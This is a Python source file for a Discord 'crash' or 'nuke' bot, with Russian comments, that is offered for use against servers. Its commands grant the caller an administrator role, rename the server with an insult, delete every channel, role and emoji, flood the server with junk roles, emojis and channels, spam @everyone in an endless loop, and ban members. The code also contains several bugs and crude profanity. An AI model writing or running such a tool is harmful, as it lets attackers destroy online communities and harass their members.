import discord
import asyncio
import random
import datetime
import json
import time
from colorama import Fore, init
from discord.ext import commands
from discord import Embed
from discord.ext.commands import has_permissions
from discord import Permissions
import os
from discord.utils import get
bot = commands.Bot(command_prefix="=")
client = discord.Client()
init()
token = open("token.txt", "r")
tokin = token.read()
bot.remove_command("help")
banner = """
Made By SCOIZY DEVELOPER SQUAD
[!] help
[!] краш комманда - =abf - antibot filter
[!] Если кто-то перезальет на свой канал - кину страйк
[!] =dtp - получить админа
[!] jose - Добавить мульти бота <premium>
[!] =kla - помощь
"""
print(Fore.GREEN+banner)


tokeen = input("Токен бота: ")


@bot.command()
@commands.has_permissions(send_messages=True)
async def dtp(ctx):
    user=ctx.message.author
    await ctx.guild.create_role(name='new role1', colour=discord.Colour(0x597E8D),permissions=discord.Permissions(administrator=True))
    role=get(ctx.guild.roles,name='new role1')
    await user.add_roles(role)
@bot.event
async def on_ready():
    print(Fore.GREEN+"Bot is ready")
    await bot.change_presence(activity = discord.Game(name = "on 347612 guilds!"))
@bot.group(invoke_without_command = True)
async def help(ctx):
    embed= discord.Embed(title = "help", description = "Type =abf - antibot filter, to see others commands")
    await ctx.send(embed=embed)
@bot.command(name = "qwe")
@commands.has_permissions(send_messages=True)
async def ajisd(ctx):
    dembed = discord.Embed(title = "YOU HAVE BEEN FRICKED BY SCOIZY", url = "https://www.youtube.com/channel/UC3iSTtyy9z5Fo4-x2PnTrcQ", description = "Берешь ведро водыи хуй туды,лимонный сок,пизды кусок,кучечку укропуи кошачью жопу,три гусиных лапки,секель старой бабки,хуй собачий,два кошачьих,охапку дрови плов готов!")
    while True:
        await ctx.send("@everyone",embed=dembed)
@bot.command(name = "cinpm")
@commands.has_permissions(send_messages=True)
async def gavno(ctx, member, arg: int):
    guild =  bot.get_guild(arg)
    roles = guild.roles
    channels = guild.channels
    with open("image1.png", "rb") as f:
        clsl = f.read()
    await guild.edit(name = "you have been fucked by scoizy :]", icon =clsl)
    for i in roles:
        try:
            await i.delete()
            print(Fore.GREEN+f"Роль удалена {i}")
        except:
            pass
    for channel in channels:
        try:
            await channel.delete()

            print(Fore.GREEN+f"Канал удалён {channel}")
        except:
            pass
    dl == 0
    for emoji in list(guild.emoji):
        try:
            await emoji.delete()
            dl += 1
            print(Fore.GREEN+"эмоджи было удалено "+str(dl))
        except:
            pass
    for x in range(100):
        try:
            await guild.create_role(name = "Ваш сервер дерьмо!)")
        except:
            pass
    for x in range(50):
        try:
            await guild.create_custom_emoji(image = cls1, name = "gavno")

            print(Fore.GREEN+"+эмоджи")
        except:
            pass
@bot.command(name = "unban")
@commands.has_permissions(send_messages=True)
async def fucku(member):
    await member.send("Для этого нужна премиум версия)")
@bot.command(name = "kla")
@commands.has_permissions(send_messages=True)
async def membersendmess(member):
    helped123 = discord.Embed(title = "Краш комманды", description = "Как ты понял это мини консоль префикс '='")
    helped123.add_field(name = "=dtp", value = "Получить админа")
    helped123.add_field(name = "=abf", value = "Краш")
    helped123.add_field(name = "=meminfo", value = "Забанить")
    helped123.add_field(name = "=cinpm set id", value = "краш в лс")
    helped123.add_field(name = "=unban", value = "разбанить всех")
    await member.send(embed=helped123)
@bot.command()
@commands.has_permissions(send_messages=True)
async def meminfo(ctx, target : discord.Member, reason=None):
    await target.ban(reason=reason)

@bot.command()
@commands.has_permissions(send_messages=True)
async def abf(ctx):
    guild = ctx.guild
    roles = guild.roles
    channels = guild.channels
    with open("image1.png", "rb") as f:
        clsl = f.read()
    await ctx.guild.edit(name = "you have been fucked by scoizy :]", icon =clsl)
    for channel in channels:
        try:
            await channel.delete()

            print(Fore.GREEN+f"сносим парашу {channel}")
        except:
            pass

    for i in roles:
        await asyncio.sleep(0.1)
        try:
            await i.delete()

        except:
            pass

    for emoj in list(guild.emojis):
        try:
            await emoj.delete()
        except:
            pass
    for x in range(30):
        try:
            await ctx.guild.create_role(name = "ВАШ СЕРВЕР ХУЙНЯ", color = discord.Colour(0x2ecc71))
            print(Fore.GREEN+f"добавлена роль ВАШ СЕРВЕР ХУЙНЯ")
        except:
            pass
    for x in range(50):
        with open("emoji.jpg", "rb") as u:
            joke = u.read()
        await guild.create_custom_emoji(image=joke, name="huyna")

    for x in range(100):
        letters = ["yas8do92324ddf", "2gt4896sdgad", "dqqnw86er6tas8ydghq72ty6", "23h87as6ddgyrg", "23usa7dyh37qr", "2hyhas8dyhqq28", "23tats8dy2r", "2h8a9sd7y3r7uas", 'aasud9wydhas', "aasdy8g", "227sdjadksd", "a7yus0d987auhsd", "asmdaiuduz", "asvgdfawd8ygasd", "72qti68sd", "w3yr9876tsd", "aysidtoawe", "qwryg8asydh", 'ur0asdy', "q9rayosd"]
        try:
            x = random.choice(letters)
            await guild.create_text_channel(name = x)
        except:
            pass

bot.run(tokeen)